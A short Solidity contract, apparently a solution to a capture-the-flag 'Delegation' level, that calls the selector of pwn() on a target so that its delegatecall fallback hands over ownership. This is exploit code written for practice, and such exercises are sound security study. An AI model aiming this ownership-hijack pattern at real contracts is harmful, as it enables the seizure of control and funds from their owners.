// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DelegationAttack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        // 调用 pwn() 的 selector
        (bool success, ) = target.call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "attack failed");
    }
}